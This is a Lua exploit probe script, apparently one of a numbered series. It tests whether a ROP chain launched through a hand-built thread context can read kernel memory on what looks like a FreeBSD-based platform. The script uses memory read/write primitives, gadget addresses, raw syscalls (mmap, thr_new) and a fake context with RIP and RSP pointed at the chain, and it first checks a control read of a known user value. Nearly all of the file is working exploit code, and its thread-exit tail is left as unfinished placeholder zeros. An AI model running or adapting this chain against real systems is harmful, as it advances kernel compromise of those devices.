-- CRASH_CLASS: LOW
-- PROBE 1013a: control for the kernel read chain.
--
-- 1006a/1008a used a stack shifted by one slot, so the chain never ran and their
-- "kernel is not readable" verdict is void. This version has the corrected layout and
-- a control that must succeed (read a known user qword) before any kernel address is
-- tried. It also ends each child with thr_exit so the thread budget is not consumed.
-- Expected outcome: [C1] out=0xcafebabe, [C2] out=0xdeadbeef + report for a kernel read.

print("=== PROBE 1013a: READ CONTROL ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local m = tostring(x):match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end

print(string.format("[0] pid=%u", to_num(mk(20)())))
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local out = mmap(page)
local src = mmap(page)
wq(src, 0xCAFEBABE)
print(string.format("[1] out=0x%X src=0x%X srcv=%s", out, src, rq(src)))

local pop_rax = to_num(gadgets["pop rax; ret"])
local ld_rax  = to_num(gadgets["mov rax, [rax]; ret"])
local pop_rdi = to_num(gadgets["pop rdi; ret"])
local st_rdi  = to_num(gadgets["mov [rdi], rax; ret"])
print(string.format("[1] gadgets 0x%X 0x%X 0x%X 0x%X", pop_rax, ld_rax, pop_rdi, st_rdi))

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local ctx = memory.alloc(0x500); local ca = as_addr(ctx)
local tb  = memory.alloc(8);      local ta = as_addr(tb)
local ts  = memory.alloc(16);     local tsa = as_addr(ts)

local function run(tag, target)
    local stack = mmap(page)
    local ch = { target, ld_rax, pop_rdi, out, st_rdi, 0, pop_rax, 431, pop_rdi, 0, 0 }
    -- tail: thr_exit(431) via fn call
    local fn = to_num(thread and thread.thr_exit and 0 or 0)
    for k=1,#ch do wq(stack+(k-1)*8, ch[k]) end
    wq(out, 0xDEADBEEF)
    for o=0,0x4F8,8 do wq(ca+o,0) end
    wq(ca+Ctx.MAGIC,0x480); wq(ca+Ctx.TYPE,0x10000)
    wq(ca+Ctx.CS,0x43); wq(ca+Ctx.SS,0x3B)
    wq(ca+Ctx.RIP,pop_rax); wq(ca+Ctx.RSP,stack)
    wq(ta,0)
    local ok, rv = pcall(function() return mk(430)(uint64(ca),uint64(ta),uint64(0)) end)
    print(string.format("[%s] spawn ok=%s rv=%s", tag, tostring(ok), ok and tostring(to_num(rv)) or ""))
    wq(tsa,0); wq(tsa+8,200*1000000)
    pcall(function() return mk(240)(uint64(tsa),uint64(0)) end)
    print(string.format("[%s] out=%s alive pid=%u", tag, rq(out), to_num(mk(20)())))
end

run("C1", src)
run("C2", 0xFFFFFFFFD8000000)
print("=== COMPLETE ===")
